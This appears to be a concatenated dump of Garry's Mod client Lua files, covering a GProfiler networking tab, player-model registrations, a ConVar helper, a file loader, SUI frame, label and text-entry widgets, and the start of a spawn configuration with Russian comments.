	ProfilerResults:SetSize(LeftContent:GetWide() - TabPadding * 2, (LeftContent:GetTall() - TabPadding * 2) / 2 - 10)
	ProfilerResults:SetPos(TabPadding, TabPadding)
	ProfilerResults:SetMultiSelect(false)
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("receiver"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("times_received"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("largest_size"))
	ProfilerResults:AddColumn(GProfiler.Language.GetPhrase("total_size"))

	local ReceiversList = vgui.Create("DListView", LeftContent)
	ReceiversList:SetSize(ProfilerResults:GetWide(), ProfilerResults:GetTall())
	ReceiversList:SetPos(TabPadding, ProfilerResults:GetTall() + TabPadding * 2)
	ReceiversList:SetMultiSelect(false)
	ReceiversList:AddColumn(GProfiler.Language.GetPhrase("name")):SetFixedWidth(ReceiversList:GetWide() / 3)
	ReceiversList:AddColumn(GProfiler.Language.GetPhrase("function"))

	local FunctionDetailsBackground = vgui.Create("DPanel", RightContent)
	FunctionDetailsBackground:SetSize(RightContent:GetWide() - TabPadding * 2, RightContent:GetTall() - TabPadding * 2)
	FunctionDetailsBackground:SetPos(TabPadding, TabPadding)
	FunctionDetailsBackground.Paint = function(s, w, h) draw.RoundedBox(4, 0, 0, w, h, MenuColors.DListRowBackground) end

	local FunctionDetails = vgui.Create("DTextEntry", FunctionDetailsBackground)
	FunctionDetails:Dock(FILL)
	FunctionDetails:SetMultiline(true)
	FunctionDetails:SetKeyboardInputEnabled(false)
	FunctionDetails:SetVerticalScrollbarEnabled(true)
	FunctionDetails:SetDrawBackground(false)
	FunctionDetails:SetTextColor(MenuColors.White)
	FunctionDetails:SetFont("GProfiler.Menu.FunctionDetails")
	FunctionDetails:SetText(GProfiler.Language.GetPhrase("receiver_select"))

	local LastSelected = ""
	table.sort(GProfiler.Net.ProfileData or {}, function(a, b) return a.t > b.t end)
	for k, v in pairs(GProfiler.Net.ProfileData or {}) do
		local Line = ProfilerResults:AddLine(k, v[1], string.format("%s (%s)", v[2], FormatBites(v[2])), string.format("%s (%s)", v[3], FormatBites(v[3])))
		Line.OnRightClick = function()
			local menu = DermaMenu()
			menu:AddOption(GProfiler.CopyLang("receiver"), function() SetClipboardText(k) end):SetIcon("icon16/page_copy.png")
			menu:AddOption(GProfiler.CopyLang("times_received"), function() SetClipboardText(v[1]) end):SetIcon("icon16/page_copy.png")
			menu:AddOption(GProfiler.CopyLang("largest_size"), function() SetClipboardText(v[2]) end):SetIcon("icon16/page_copy.png")
			menu:AddOption(GProfiler.CopyLang("total_size"), function() SetClipboardText(v[3]) end):SetIcon("icon16/page_copy.png")
			menu:Open()
		end

		Line.OnSelect = function()
			if not v[4] or LastSelected == v then return end
			LastSelected = v

			FunctionDetails:SetText(GProfiler.Language.GetPhrase("requesting_source"))
			GProfiler.RequestFunctionSource(v[4], tonumber(v[5]), tonumber(v[6]), function(source)
				if not IsValid(FunctionDetails) then return end
				FunctionDetails:SetText(table.concat(source, "\n"))
			end)
		end
	end

	ProfilerResults:SortByColumn(2, true)

	local function UpdateLists()
		GProfiler.StyleDListView(ProfilerResults)
		GProfiler.StyleDListView(ReceiversList)
	end
	UpdateLists()

	GetReceiverTable(GProfiler.Net.Realm, function(receiverTbl)
		if not IsValid(ReceiversList) then return end
		for k, v in pairs(receiverTbl) do
			local Line = ReceiversList:AddLine(k, v[1])
			Line.OnRightClick = function()
				local menu = DermaMenu()
				menu:AddOption(GProfiler.CopyLang("name"), function() SetClipboardText(k) end):SetIcon("icon16/page_copy.png")
				menu:AddOption(GProfiler.CopyLang("function"), function() SetClipboardText(v) end):SetIcon("icon16/page_copy.png")
				menu:Open()
			end

			Line.OnSelect = function()
				if not IsValid(FunctionDetails) then return end
				FunctionDetails:SetText(GProfiler.Language.GetPhrase("requesting_source"))
				GProfiler.RequestFunctionSource(v[2], tonumber(v[3]), tonumber(v[4]), function(source)
					if not IsValid(FunctionDetails) then return end
					FunctionDetails:SetText(table.concat(source, "\n"))
				end)
			end
		end
		UpdateLists()
	end)
end
GProfiler.Menu.RegisterTab("Networking", "icon16/connect.png", 2, GProfiler.Net.DoTab, function()
	if GProfiler.Net.ProfileActive then
		return "", MenuColors.ActiveProfile
	end
	return nil
end)

net.Receive("GProfiler_Net_ServerProfileStatus", function()
	local status = net.ReadBool()
	local ply = net.ReadEntity()
	GProfiler.Net.ProfileActive = status

	if ply == LocalPlayer() and not GProfiler.Net.ProfileActive then
		GProfiler.Menu.OpenTab("Net", GProfiler.Net.DoTab)
	end
end)

net.Receive("GProfiler_Net_SendData", function()
	GProfiler.Net.ProfileData = {}
	for i = 1, net.ReadUInt(32) do
		GProfiler.Net.ProfileData[net.ReadString()] = {net.ReadUInt(32), net.ReadUInt(32), net.ReadUInt(32), net.ReadString(), net.ReadUInt(16), net.ReadUInt(16)}
	end
end)

--PATH addons/pm_cp_mix_models/lua/autorun/gtavfibsuit1.lua:
player_manager.AddValidModel( "DOA Agent", "models/sentry/gtav/doa/doapm.mdl" )
--PATH addons/svnv_ru_lib/lua/autorun/load/shared/fastfunc.lua:
local tonumber=tonumber

local convarcache={}

function CreateClientConVarFast(cvar,initial,save,t,server)
	
	local cached = convarcache[cvar]
	if cached then return cached[1],cached[2] end
	
	local val
	local c = CreateClientConVar(cvar,initial,save,server)
	--Msg("[FCVar] ",cvar,": ")
	
	local ConVarChanged
	
	if t=="string" or t=="str" then
		ConVarChanged = function( cvar, old, new ) 
			val = new 
		end
	elseif t=="boolean" or t=="bool" then
		ConVarChanged = function( cvar, old, new ) 
			if new == "0" then
				val = false
			elseif new == "1" then 
				val = true
			else
				val = (tonumber(new) or 0)>=1
			end
		end
	
	elseif t=="number" or t=="num" then
		ConVarChanged = function( cvar, old, new ) 
			val= tonumber( new ) or 0
		end
	
	elseif t=="integer" or t=="int" then
		ConVarChanged = function( cvar, old, new ) 
			val= math.floor(tonumber( new ) or 0)
		end
	end

	if not ConVarChanged then error("Invalid type: "..tostring(t)) end
	cvars.AddChangeCallback(cvar,ConVarChanged)
	ConVarChanged(cvar,nil,c:GetString())
	
	local function GetConVarValue() return val end
	
	--print(c:GetString(),initial,c:GetBool(),GetConVarValue(),t,save,server)

	convarcache[cvar]={GetConVarValue,c}
	return GetConVarValue,c
end
--PATH addons/radial_menu/lua/nexus_framework/core/load.lua:
Nexus.Scripts = Nexus.Scripts or {}

local LOADER = {}
LOADER.__index = LOADER

AccessorFunc(LOADER, "m_name", "Name")
AccessorFunc(LOADER, "m_acronym", "Acronym")
AccessorFunc(LOADER, "m_loadDirectory", "LoadDirectory")
AccessorFunc(LOADER, "m_color", "Color")

LOADER.Realms = {
	["SERVER"] = SERVER and include or function() end,
	["CLIENT"] = CLIENT and include or AddCSLuaFile,
	["SHARED"] = function(path)
		if (SERVER) then
			include(path)
			AddCSLuaFile(path)
		else
			include(path)
		end
	end
}

function LOADER:GetRealm(realm)
	realm = self.Realms[realm]

	if (realm) then 
		return realm
	end
end

function LOADER:GetLoadColor()
	return self:GetColor()
end

function LOADER:GetLoadMessage(realm, path)
end

function LOADER:RegisterAcronym()
	Nexus.Scripts[self:GetAcronym()] = self
end

function LOADER:Load(dir, realm, recursive, ignoreFiles)
	ignoreFiles = ignoreFiles or {}
	local path = self:GetLoadDirectory()
	if (!string.EndsWith(path, "/")) then path = path .. "/" end
	if (!string.EndsWith(dir, "/")) then dir = dir .. "/" end
	
	realm = realm:upper()
	local realmFunc = self:GetRealm(realm)
	if (!realmFunc) then return end

	local files, folders = file.Find(path .. dir .. "*", "LUA")

	for fileIndex, file in ipairs(files) do
		if (ignoreFiles[file]) then continue end

		local path = path .. dir .. file
		self:GetLoadMessage(realm, path)
		
		realmFunc(path)
	end

	if (recursive) then
		for folderIndex, folder in ipairs(folders) do
			self:Load(dir .. folder, realm, recursive, ignoreFiles)
		end
	end
end

function LOADER:Register()
	local time = SysTime() - self.start
	time = math.Round(time, 4) .. "s"
end

function Nexus:Loader()
	local tbl = table.Copy(LOADER)
	tbl.start = SysTime()

	return tbl
end
--PATH addons/model_terror/lua/autorun/osamaplayer.lua:
list.Set( "PlayerOptionsModel", "osamaplayer", "models/code_gs/osama/osamaplayer.mdl" )
player_manager.AddValidModel( "osamaplayer", "models/code_gs/osama/osamaplayer.mdl" )
player_manager.AddValidHands( "osamaplayer", "models/weapons/c_arms_refugee.mdl", 1, "00000000" )

--PATH addons/pm_cp_mix_models/lua/autorun/pd2_la_cops.lua:
player_manager.AddValidModel( "Los Angeles Cop #2", "models/payday2/units/la_cop_2_player.mdl" )
player_manager.AddValidModel( "Los Angeles Cop #4", "models/payday2/units/la_cop_4_player.mdl" )
--PATH addons/pm_cp_mix_models/lua/autorun/pd2_zswat.lua:
list.Set( "PlayerOptionsAnimations", "PD2_zeal_swat", { "idle_suitcase", "menu_combine", "idle_all_01" } )
player_manager.AddValidModel( "PD2_zeal_swat", "models/payday2/units/zeal_swat_player.mdl" )
player_manager.AddValidHands( "PD2_zeal_swat", "models/payday2/units/zeal_swat_arms.mdl",	0, "0000000" )

--PATH addons/_adminmodules_menu/lua/sui/vgui/sui_frame.lua:
local math = math
local gui = gui
local draw = draw
local surface = surface

local ScrW = ScrW
local ScrH = ScrH
local IsValid = IsValid
local ipairs = ipairs

local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name
local TDLib = sui.TDLib

local FRAME_FONT = SUI.CreateFont("Frame", "Roboto", 18)

local Panel = FindMetaTable("Panel")

local PANEL = {}

AccessorFunc(PANEL, "m_bHeaderHeight", "HeaderHeight", FORCE_NUMBER)
AccessorFunc(PANEL, "m_bTitleFont", "TitleFont", FORCE_STRING)
AccessorFunc(PANEL, "m_bSizable", "Sizable", FORCE_BOOL)
AccessorFunc(PANEL, "m_iMinWidth", "MinWidth", FORCE_NUMBER)
AccessorFunc(PANEL, "m_iMinHeight", "MinHeight", FORCE_NUMBER)

local header_Think = function(s)
	local parent = s.parent
	local sw, sh = ScrW(), ScrH()

	if s.dragging then
		local x, y = input.GetCursorPos()
		x, y = math.Clamp(x, 1, sw - 1), math.Clamp(y, 1, sh - 1)
		x, y = x - s.dragging[1], y - s.dragging[2]

		parent:SetPos(x, y)
		parent:InvalidateLayout(true)
		parent:OnPosChanged()
	else
		local x, y, w, h = parent:GetBounds()
		parent:SetPos(math.Clamp(x, 5, sw - w - 5), math.Clamp(y, 5, sh - h - 5))
	end
end

local header_OnMousePressed = function(s)
	local parent = s.parent
	s.dragging = {gui.MouseX() - parent.x, gui.MouseY() - parent.y}
	s:MouseCapture(true)
end

local header_OnMouseReleased = function(s)
	s.dragging = nil
	s:MouseCapture(false)
end

local title_SetBGColor = function(s, c)
	s:SetVisible(c and true or false)
end

local title_update_color = function(s)
	s:SetTextColor(SUI.GetColor("title"))
end

local close_DoClick = function(s)
	s.frame:Remove()
end

function PANEL:Init()
	local header_buttons = {}
	self.header_buttons = header_buttons

	self:Center()
	self:SetHeaderHeight(28)

	local header = self:Add("PANEL")
	header:Dock(TOP)
	header.Paint = self.HeaderPaint
	header:SetCursor("sizeall")

	header.parent = self
	header.Think = header_Think
	header.OnMousePressed = header_OnMousePressed
	header.OnMouseReleased = header_OnMouseReleased
	self.header = header

	local title = header:Add(NAME .. ".Label")
	title:Dock(LEFT)
	title:DockMargin(6, 2, 0, 2)
	title:SetText("")
	title:SetTextColor(SUI.GetColor("title"))
	title:SizeToContents()
	title.SetBGColor = title_SetBGColor
	hook.Add(NAME .. ".ThemeChanged", title, title_update_color)
	self.title = title

	self.close = self:AddHeaderButton("https://raw.githubusercontent.com/Srlion/Addons-Data/main/icons/sui/close.png", "close", close_DoClick)
	self.close.frame = self

	self:SetSize(weight(520), height(364))
	self:SetTitleFont(FRAME_FONT)
	-- SUI.OnScaleChanged(self, self.ScaleChanged)

	function self:PerformLayout(w, h)
		if IsValid(title) then
			title:SizeToContents()
		end

		if IsValid(header) then
			header:SetTall(SUI.Scale(self:GetHeaderHeight()))
		end

		for k, v in ipairs(header_buttons) do
			if IsValid(v) then
				v:SetWide(v:GetTall())
				local margin = SUI.Scale(4)
				v.image:DockMargin(margin, margin, margin, margin)
			end
		end
	end
end

function PANEL:SetSize(w, h)
	self.real_w, self.real_h = w, h
	-- self:ScaleChanged()
end

function PANEL:HeaderPaint(w, h)
	draw.RoundedBoxEx(3, 0, 0, w, h, SUI.GetColor("header"), true, true)
end

local SetSize = Panel.SetSize
PANEL.RealSetSize = SetSize
function PANEL:ScaleChanged()
	if self.sizing then return end

	local new_w, new_h = SUI.Scale(self.real_w), SUI.Scale(self.real_h)
	self.x, self.y = self.x + (self:GetWide() / 2 - new_w / 2), self.y + (self:GetTall() / 2 - new_h / 2)
	SetSize(self, new_w, new_h)
	self:InvalidateLayout(true)
end

function PANEL:Paint(w, h)
	if SUI.GetColor("frame_blur") then
		TDLib.BlurPanel(self)
	end

	self:RoundedBox("Background", 3, 0, 0, w, h, SUI.GetColor("frame"))
end

function PANEL:SetTitleFont(font)
	self.m_bTitleFont = font
	self.title:SetFont(font)
end

function PANEL:SetTitle(text)
	self.title:SetText(text)
	self.title:SizeToContents()
end

function PANEL:AddHeaderButton(image_name, name, callback)
	local button = self.header:Add("DButton")
	button:SetText("")
	button:Dock(RIGHT)
	button:DockMargin(0, 2, #self.header:GetChildren() == 1 and 4 or 2, 2)

	local hover = name .. "_hover"
	local press = name .. "_press"
	local circle = {}
	button.Paint = function(s, w, h)
		if s:IsHovered() then
			TDLib.DrawCircle(circle, w / 2, h / 2, w / 2, SUI.GetColor(hover))
		end

		if s.Depressed then
			TDLib.DrawCircle(circle, w / 2, h / 2, w / 2, SUI.GetColor(press))
		end
	end
	button.DoClick = callback

	local image = button:Add(NAME .. ".Image")
	image:Dock(FILL)
	image:SetMouseInputEnabled(false)
	image:SetImage(image_name)

	button.image = image

	table.insert(self.header_buttons, button)

	return button
end

function PANEL:OnMousePressed(_, checking)
	if not self.m_bSizable then return end

	local x, y = self:LocalToScreen(0, 0)
	local w, h = self:GetSize()
	if gui.MouseX() > (x + w - 20) and gui.MouseY() > (y + h - 20) then
		if not checking then
			self.sizing = {gui.MouseX() - w, gui.MouseY() - h}
			self:MouseCapture(true)
		end

		self:SetCursor("sizenwse")

		return
	end

	if checking then
		self:SetCursor("arrow")
	end
end

function PANEL:OnMouseReleased()
	if not self.m_bSizable then return end

	self:MouseCapture(false)
	-- SUI.CallScaleChanged()
	self.sizing = nil
end

function PANEL:Think()
	if not self.m_bSizable then return end

	self:OnMousePressed(nil, true)

	if not self.sizing then return end

	local sw, sh = ScrW(), ScrH()

	local cx, cy = input.GetCursorPos()
	local mousex = math.Clamp(cx, 1, sw - 1)
	local mousey = math.Clamp(cy, 1, sh - 1)

	local x = mousex - self.sizing[1]
	x = math.Clamp(x, self.m_iMinWidth, sw - 10)

	local y = mousey - self.sizing[2]
	y = math.Clamp(y, self.m_iMinHeight, sh - 10)

	self.real_w, self.real_h = x, y
	SetSize(self, x, y)
	self:InvalidateLayout(true)
	self:SetCursor("sizenwse")
end

function PANEL:OnPosChanged()
end

local SetVisible = Panel.SetVisible
local Remove = Panel.Remove

local anim_speed = 0.2

local show = function(s)
	local w, h = s.real_w, s.real_h

	if s.anim_scale then
		w, h = SUI.Scale(w), SUI.Scale(h)
	end

	SetVisible(s, true)

	SetSize(s, w * 1.1, h * 1.1)
	s:Center()

	s:Stop()
	s:SizeTo(w, h, anim_speed, 0, -1)
	s:MoveTo((ScrW() / 2) - (w / 2), (ScrH() / 2) - (h / 2), anim_speed, 0, -1)
	s:AlphaTo(255, anim_speed + 0.02, 0)
	s:MakePopup()
end

local remove = function(s, hide)
	if not hide and not s:IsVisible() then
		Remove(s)
		return
	end

	local w, h = s.real_w, s.real_h

	if s.anim_scale then
		w, h = SUI.Scale(w), SUI.Scale(h)
	end

	w, h = w * 1.1, h * 1.1

	s:Stop()
	s:SizeTo(w, h, anim_speed, 0, -1)
	s:MoveTo((ScrW() / 2) - (w / 2), (ScrH() / 2) - (h / 2), anim_speed, 0, -1)
	s:SetMouseInputEnabled(false)
	s:SetKeyboardInputEnabled(false)
	s:AlphaTo(0, anim_speed + 0.02, 0, function()
		if hide then
			SetVisible(s, false)
		else
			Remove(s)
		end
	end)
end

local hide = function(s)
	remove(s, true)
end

function PANEL:AddAnimations(w, h, no_scale)
	self.anim_scale = not no_scale
	self.real_w, self.real_h = w, h

	self:SetAlpha(0)
	show(self)

	self.Remove = remove
	self.Hide = hide
	self.Show = show
end

sui.register("Frame", PANEL, "EditablePanel")
--PATH addons/_adminmodules_menu/lua/sui/vgui/sui_label.lua:
local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name
local MOUSE_LEFT = MOUSE_LEFT

local SysTime = SysTime

local PANEL = {}

AccessorFunc(PANEL, "m_colText", "TextColor")
AccessorFunc(PANEL, "m_colTextStyle", "TextStyleColor")
AccessorFunc(PANEL, "m_FontName", "Font")

AccessorFunc(PANEL, "m_bDoubleClicking", "DoubleClickingEnabled", FORCE_BOOL)
AccessorFunc(PANEL, "m_bAutoStretchVertical", "AutoStretchVertical", FORCE_BOOL)
AccessorFunc(PANEL, "m_bIsMenuComponent", "IsMenu", FORCE_BOOL)

AccessorFunc(PANEL, "m_bBackground", "PaintBackground",	FORCE_BOOL)
AccessorFunc(PANEL, "m_bBackground", "DrawBackground",	FORCE_BOOL)
AccessorFunc(PANEL, "m_bDisabled", "Disabled", FORCE_BOOL)

AccessorFunc(PANEL, "m_bIsToggle", "IsToggle", FORCE_BOOL)
AccessorFunc(PANEL, "m_bToggle", "Toggle", FORCE_BOOL)

AccessorFunc(PANEL, "m_bBright", "Bright", FORCE_BOOL)
AccessorFunc(PANEL, "m_bDark", "Dark", FORCE_BOOL)
AccessorFunc(PANEL, "m_bHighlight",	"Highlight", FORCE_BOOL)

PANEL:SetIsToggle(false)
PANEL:SetToggle(false)
PANEL:SetDisabled(false)
PANEL:SetDoubleClickingEnabled(true)

local Panel = FindMetaTable("Panel")
local SetMouseInputEnabled = Panel.SetMouseInputEnabled
local SetPaintBackgroundEnabled = Panel.SetPaintBackgroundEnabled
local SetPaintBorderEnabled = Panel.SetPaintBorderEnabled
local InvalidateLayout = Panel.InvalidateLayout
local SetFGColor = Panel.SetFGColor
function PANEL:Init()
	SetMouseInputEnabled(self, false)
	SetPaintBackgroundEnabled(self, false)
	SetPaintBorderEnabled(self, false)
end

function PANEL:AllowScale()
	SUI.OnScaleChanged(self, self.ScaleChanged)
end

function PANEL:ScaleChanged()
	self:SizeToContents()
end

function PANEL:SetFont(font)
	if self.m_FontName == font then return end

	self.m_FontName = font
	self:SetFontInternal(self.m_FontName)
end

function PANEL:SetTextColor(col)
	if self.m_colText == col then return end

	self.m_colText = col
	SetFGColor(self, col.r, col.g, col.b, col.a)
end
PANEL.SetColor = PANEL.SetTextColor

function PANEL:GetColor()
	return self.m_colText or self.m_colTextStyle
end

function PANEL:Toggle()
	if not self:GetIsToggle() then return end

	self:SetToggle(not self:GetToggle())
	self:OnToggled(self:GetToggle())
end

function PANEL:SetDisabled(bDisabled)
	self.m_bDisabled = bDisabled
	InvalidateLayout(self)
end

function PANEL:SetEnabled(bEnabled)
	self:SetDisabled(not bEnabled)
end

function PANEL:IsEnabled()
	return not self:GetDisabled()
end

function PANEL:ApplySchemeSettings()
	local col = self:GetColor()
	if not col then return end

	self:SetFGColor(col.r, col.g, col.b, col.a)
end

function PANEL:AutoStretchVerticalThink()
	self:SizeToContentsY()
end

function PANEL:SetAutoStretchVertical(enable)
	self.m_bAutoStretchVertical = enable
	self.Think = enable and self.AutoStretchVerticalThink or nil
end

function PANEL:OnCursorEntered()
	InvalidateLayout(self, true)
end

function PANEL:OnCursorExited()
	InvalidateLayout(self, true)
end

function PANEL:OnMousePressed(mousecode)
	if self:GetDisabled() then return end

	if mousecode == MOUSE_LEFT and not dragndrop.IsDragging() and self.m_bDoubleClicking then
		if self.LastClickTime and SysTime() - self.LastClickTime < 0.2 then

			self:DoDoubleClickInternal()
			self:DoDoubleClick()
			return
		end

		self.LastClickTime = SysTime()
	end

	if self:IsSelectable() and mousecode == MOUSE_LEFT and input.IsShiftDown() then
		return self:StartBoxSelection()
	end

	self:MouseCapture(true)
	self.Depressed = true
	self:OnDepressed()
	InvalidateLayout(self, true)

	self:DragMousePress(mousecode)
end

function PANEL:OnMouseReleased(mousecode)
	self:MouseCapture(false)

	if self:GetDisabled() then return end
	if not self.Depressed and dragndrop.m_DraggingMain ~= self then return end

	if self.Depressed then
		self.Depressed = nil
		self:OnReleased()
		InvalidateLayout(self, true)
	end

	if self:DragMouseRelease(mousecode) then return end

	if self:IsSelectable() and mousecode == MOUSE_LEFT then
		local canvas = self:GetSelectionCanvas()
		if canvas then
			canvas:UnselectAll()
		end
	end

	if not self.Hovered then return end

	self.Depressed = true

	if mousecode == MOUSE_RIGHT then
		self:DoRightClick()
	end

	if mousecode == MOUSE_LEFT then
		self:DoClickInternal()
		self:DoClick()
	end

	if mousecode == MOUSE_MIDDLE then
		self:DoMiddleClick()
	end

	self.Depressed = nil
end

function PANEL:OnReleased()
end

function PANEL:OnDepressed()
end

function PANEL:OnToggled(bool)
end

function PANEL:DoClick()
	self:Toggle()
end

function PANEL:DoRightClick()
end

function PANEL:DoMiddleClick()
end

function PANEL:DoClickInternal()
end

function PANEL:DoDoubleClick()
end

function PANEL:DoDoubleClickInternal()
end

sui.register("Label", PANEL, "Label")
--PATH addons/_adminmodules_menu/lua/sui/vgui/sui_text_entry.lua:
local sui = sui

local surface = surface
local utf8 = sui.utf8
local draw = draw
local math = math

local IsValid = IsValid
local tostring = tostring
local tonumber = tonumber

local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name

local GetColor = SUI.GetColor
local TEXT_ENTRY_FONT = SUI.CreateFont("TextEntry", "Roboto Regular", 16)

local Panel = {}

-- sui.scaling_functions(Panel)

AccessorFunc(Panel, "m_FontName", "Font", FORCE_STRING)
AccessorFunc(Panel, "m_Editable", "Editable", FORCE_BOOL)
AccessorFunc(Panel, "m_Placeholder", "Placeholder", FORCE_STRING)
AccessorFunc(Panel, "m_MaxChars", "MaxChars", FORCE_NUMBER)
AccessorFunc(Panel, "m_Numeric", "Numeric", FORCE_BOOL)
AccessorFunc(Panel, "m_NoBar", "NoBar", FORCE_BOOL)
AccessorFunc(Panel, "m_BarColor", "BarColor")
AccessorFunc(Panel, "m_Background", "Background")
AccessorFunc(Panel, "m_Radius", "Radius")
AccessorFunc(Panel, "m_NoEnter", "NoEnter")

Panel:SetRadius(3)

function Panel:Init()
	self:SetupTransition("TextEntryReady", 0.9, function()
		return self:IsEditing() or self:GetBarColor() ~= nil
	end)

	self:SetUpdateOnType(true)
	self:SetCursor("beam")
	self:SetFont(TEXT_ENTRY_FONT)
	self:SetPlaceholder("Placeholder text")

	self:SetSize(200, 22)

	self.allowed_numeric_characters = "1234567890.-"

	self.history = {}
	self.history_pos = 1
	self.can_use_history = true
end

function Panel:SetCaretPos(pos)
	DTextEntry.SetCaretPos(self, math.Clamp(pos, 0, utf8.len(self:GetText())))
end

function Panel:SetValue(value)
	self:SetText(value)
	self:OnValueChange(value)
end

function Panel:AllowInput(ch)
	if self:CheckNumeric(ch) then return true end

	if sui.wspace_chs[ch] or sui.cntrl_chs[ch] then
		return true
	end

	local max_chars = self:GetMaxChars()
	if max_chars and #self:GetText() >= max_chars then
		surface.PlaySound("resource/warning.wav")
		return true
	end
end

function Panel:AddValue(v, i, j)
	local original_text = self:GetText()

	local start
	if i then
		start = original_text:sub(1, i)
	else
		start = utf8.sub(original_text, 1, self:GetCaretPos())
	end

	local text = start .. v
	local caret_pos = utf8.len(text)

	local _end
	if j then
		_end = original_text:sub(j)
	else
		_end = utf8.sub(original_text, utf8.len(start) + 1)
	end
	text = text .. _end

	local max_chars = self:GetMaxChars()
	if max_chars then
		text = text:sub(1, max_chars)
	end

	self:SetValue(text)
	self:SetCaretPos(caret_pos)
end

function Panel:OnKeyCodeTyped(code)
	if self.no_down then
		self.no_down = nil
		return
	end

	if code == KEY_UP or code == KEY_DOWN then
		if not self:UpdateFromHistory(code) then
			return true
		end

		local lines, caret_line = self:GetNumLines()

		if lines == 1 then
			return true
		end

		--
		-- this fixes a weird issue
		-- make the text entry has at least 2 lines, go up then go down, you won't be able to go up again
		--
		if code == KEY_DOWN and lines == caret_line + 1 then
			self.no_down = true
			gui.InternalKeyCodeTyped(KEY_DOWN)
		end
	end

	self:OnKeyCode(code)

	if code == KEY_ENTER then
		if IsValid(self.Menu) then
			self.Menu:Remove()
		end

		if not self:GetNoEnter() then
			self:FocusNext()
			self:OnEnter()
		end
	end
end

function Panel:DisallowFloats(disallow)
	if not isbool(disallow) then
		disallow = true
	end

	if disallow then
		self.allowed_numeric_characters = self.allowed_numeric_characters:gsub("%.", "", 1)
	elseif not self.allowed_numeric_characters:find(".", 1, true) then
		self.allowed_numeric_characters = self.allowed_numeric_characters .. "."
	end
end

function Panel:DisallowNegative(disallow)
	if not isbool(disallow) then
		disallow = true
	end

	if disallow then
		self.allowed_numeric_characters = self.allowed_numeric_characters:gsub("%-", "", 1)
	elseif not self.allowed_numeric_characters:find("-", 1, true) then
		self.allowed_numeric_characters = self.allowed_numeric_characters .. "-"
	end
end

function Panel:CheckNumeric(value)
	if not self:GetNumeric() then return false end

	if not self.allowed_numeric_characters:find(value, 1, true) then
		return true
	end

	local new_value = ""
	local current_value = tostring(self:GetText())

	local caret_pos = self:GetCaretPos()
	for i = 0, #current_value do
		new_value = new_value .. current_value:sub(i, i)
		if i == caret_pos then
			new_value = new_value .. value
		end
	end

	if #current_value ~= 0 and not tonumber(new_value) then
		return true
	end

	return false
end

function Panel:AddHistory(txt)
	if not txt or txt == "" then return end
	local history = self.history
	if history[#history] ~= txt then
		table.insert(history, txt)
	end
end

function Panel:UpdateFromHistory(code)
	if not self.can_use_history then return end

	local lines, caret_line = self:GetNumLines()

	if code == KEY_UP then
		if caret_line > 1 then return true end -- enable the caret to move up and down

		if self.history_pos <= 1 then return end

		self.history_pos = self.history_pos - 1
	elseif code == KEY_DOWN then
		if caret_line ~= lines then return true end

		if self.history_pos >= #self.history then
			self:SetValue("")
			self:SetCaretPos(0)
			self.history_pos = #self.history + 1
			return
		end

		self.history_pos = self.history_pos + 1
	end

	local text = self.history[self.history_pos]
	if not text then return end

	self:SetValue(text)
	self:SetCaretPos(utf8.len(text))
end

function Panel:OnTextChanged()
	self.history_pos = #self.history + 1

	local text = self:GetText()

	self.can_use_history = text == "" and true or false

	if self:GetUpdateOnType() then
		self:UpdateConvarValue()
		self:OnValueChange(text)
	end

	self:OnChange()
end

function Panel:Paint(w, h)
	self:RoundedBox("Background", self:GetRadius(), 0, 0, w, h, GetColor("text_entry_bg") or self:GetBackground())

	local text_entry_3 = GetColor("text_entry_3")

	if self:GetText() == "" then
		local old_text = self:GetText()
		self:SetText(self:GetPlaceholder())
		self:DrawTextEntryText(GetColor("text_entry_2"), text_entry_3, text_entry_3)
		self:SetText(old_text)
	else
		self:DrawTextEntryText(GetColor("text_entry"), text_entry_3, text_entry_3)
	end

	if not self:GetNoBar() then
		local bar_color = self:GetBarColor()

		self:RoundedBox("Bar1", 0, 0, h - 1, w, 1, GetColor("text_entry_bar_color"))

		local bar = math.Round(w * self.TextEntryReady)
		if bar > 0 then
			self:RoundedBox("Bar2", 0, (w / 2) - (bar / 2), h - 1, bar, 1, bar_color or text_entry_3)
		end
	end
end

-- https://github.com/ValveSoftware/source-sdk-2013/blob/0d8dceea4310fde5706b3ce1c70609d72a38efdf/mp/src/vgui2/vgui_controls/TextEntry.cpp#L969
function Panel:GetNumLines(wide)
	local num_lines = 1

	wide = wide or self:GetWide() - 2

	local vbar = self:GetChildren()[1]
	if vbar then
		wide = wide - vbar:GetWide()
	end

	local char_width
	local x = 3

	local word_start_index = 1
	local word_start_len
	local word_length = 0
	local has_word = false
	local just_started_new_line = true
	local word_started_on_new_line = true

	local start_char = 1

	surface.SetFont(self:GetFont())

	local i = start_char
	local text, n = utf8.force(self:GetText())
	local caret_line = 0
	local caret_pos = self:GetCaretPos()
	local caret_i = 1
	while i <= n do
		local ch_len = utf8.char_bytes(text:byte(i))
		local ch = text:sub(i, i + ch_len - 1)

		if ch ~= " " then
			if not has_word then
				word_start_index = i
				word_start_len = ch_len
				has_word = true
				word_started_on_new_line = just_started_new_line
				word_length = 0
			end
		else
			has_word = false
		end

		char_width = surface.GetTextSize(ch)
		just_started_new_line = false

		if (x + char_width) >= wide then
			x = 3

			just_started_new_line = true
			has_word = false

			if word_started_on_new_line then
				num_lines = num_lines + 1
			else
				num_lines = num_lines + 1
				i = (word_start_index + word_start_len) - ch_len
			end

			word_length = 0
		end

		x = x + char_width
		word_length = word_length + char_width

		if caret_i == caret_pos then
			caret_line = num_lines
		end

		i = i + ch_len
		caret_i = caret_i + 1
	end

	return num_lines, caret_line
end

function Panel:SetCheck(func, col)
	function self:OnValueChange(text)
		if func(text) == false then
			self.valid = false
			self:SetBarColor(GetColor("close_hover"))
			self:SetNoEnter(true)
		else
			self.valid = true
			self:SetBarColor(col)
			self:SetNoEnter(false)
		end
	end
	self:SetValue(self:GetText())
end

sui.register("TextEntry", Panel, "DTextEntry")
--PATH addons/111mod/lua/autorun/sh_configuration.lua:
spawnInt = {}
spawnInt.configuration = {}
spawnInt.configuration.RegisterTeam = {}

// ==============================================================================================// 
// [Важно] После каждых изменении/добавлении переменных здесь,пожалуйста,перезагружайте сервер   //        
// ==============================================================================================//  
--/
--| Имя: Позиция для спавна игроков
--|________________________________/
--| Инструкция: Чтобы установить координаты,вам нужно находится в игре.
--|             [1] После того,как вы появились на сервере;
--|             [2] Вам следует выбрать место для спавна;
